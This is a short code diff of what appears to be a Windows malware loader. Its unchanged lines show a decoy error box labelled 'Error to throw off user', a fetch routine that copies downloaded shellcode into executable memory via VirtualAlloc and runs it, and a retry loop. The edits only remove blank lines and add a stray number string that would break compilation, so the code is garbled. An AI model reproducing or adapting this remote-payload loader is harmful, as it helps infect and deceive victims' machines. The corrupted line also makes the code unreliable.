@@ -17,7 +17,7 @@ int messagebox() {
 		"Error to throw off user. ",
 		"Error:",
 		MB_ICONEXCLAMATION | MB_OK
-	);
+	);215304215304
 	return msgboxID;
 }
 
@@ -60,7 +60,6 @@ int fetch(string server, string path) {
 	void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memcpy(exec, shellcode, sizeof(shellcode));
 	((void(*)())exec)();
-	
 	return 0;
 }
 
@@ -77,6 +76,5 @@ int main() {
 		    continue;
 		Sleep(100000);
 	}
-
 	return 0;
 }
